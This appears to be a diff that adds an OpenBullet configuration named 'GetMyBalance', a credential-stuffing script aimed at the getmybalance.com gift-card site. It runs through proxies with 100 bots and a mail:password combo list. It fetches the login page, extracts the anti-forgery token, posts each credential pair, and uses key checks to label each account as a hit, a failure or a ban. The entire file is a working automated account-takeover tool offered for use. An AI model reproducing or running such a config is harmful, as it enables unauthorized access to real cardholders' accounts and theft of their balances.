@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "GetMyBalance",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-19T06:04:12.5569224+00:00",
+  "AdditionalInfo": "",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://getmybalance.com/Account/Login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE___REQUESTVERIFICATIONTOKEN PARSE "<SOURCE>" CSS "[name=__RequestVerificationToken]" "value" 0 -> VAR "TOKEN" "" "" 
+#POST_LOGIN REQUEST POST "https://getmybalance.com/Account/Login" AutoRedirect=TRUE 
+  CONTENT "__RequestVerificationToken=<TOKEN>&ReturnUrl=%2FCard%2FMyCards&OriginationEmailId=&Username=<USER>&Password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Ban OR 
+    KEY " field is required" 
+  KEYCHAIN Failure OR 
+    KEY "The user name or password is invalid" 
+    KEY "Your account is not yet activated. " 
+  KEYCHAIN Success OR 
+    KEY "You can view all of your cards associated with your user name" 
